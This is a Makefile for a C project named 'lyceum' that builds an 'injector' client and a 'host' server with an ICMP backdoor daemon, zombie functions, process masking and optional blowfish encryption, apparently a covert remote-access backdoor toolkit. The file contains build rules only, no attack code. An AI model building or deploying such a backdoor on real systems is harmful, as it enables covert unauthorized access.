OBJS=lyceum_injector.o lyceum_funcs.o use.o random.o blowfish.o  
OBJS+=$(ICMP)/icmp_backdoor_connect.o  $(ICMP)/zombie_funcs.o
S_OBJS=lyceum_host.o comcodes.o random.o edu_proc_mask.o blowfish.o
S_OBJS+=$(ICMP)/icmp_backdoord.o 

# encrypted
#CFLAGS=-O2 -Wall -I ./include -I ./blowfish  -I icmp/include -s -D__USE_GNU
# no encryption or authentication
CFLAGS=-O2 -Wall -I ./include -I icmp/include -I blowfish -s -D_NO_ENCRYPTION_ 

CC=gcc
RM=rm

CLIENT=lyceum_injector
SERVER=lyceum_host
KEY=keygen
ICMP=icmp

all: $(KEY) $(ICMP) $(CLIENT) $(SERVER)

clean:
	make very_clean -i
	make clean -i -C keygen -f Makefile

very_clean:	
	$(RM) $(OBJS) $(S_OBJS) $(CLIENT) $(SERVER) lyceum_proto.o $(ICMP)/s_icmp_pkt.o 2>&1 > /dev/null

$(KEY): random.o
	@make -C keygen -f Makefile
	@./keygen/keygen
	@cd ..

$(ICMP): random.o
	@make -C icmp -f Makefile
	@cd ..
	
$(CLIENT): $(OBJS) 
	$(CC) -D_CLIENT_ $(CFLAGS) -c lyceum_proto.c
	$(CC) -D_CLIENT_ $(CFLAGS) -c $(ICMP)/s_icmp_pkt.c -o $(ICMP)/s_icmp_pkt.o
	$(CC) $(OBJS) lyceum_proto.o $(ICMP)/s_icmp_pkt.o -s -o $(CLIENT)

$(SERVER): $(S_OBJS)
	$(CC) -D_SERVER_ $(CFLAGS) -c -o lyceum_proto.o lyceum_proto.c
	$(CC) -D_SERVER_ $(CFLAGS) -c $(ICMP)/s_icmp_pkt.c -o $(ICMP)/s_icmp_pkt.o
	$(CC) $(S_OBJS) lyceum_proto.o $(ICMP)/s_icmp_pkt.o -s -lutil -o $(SERVER)
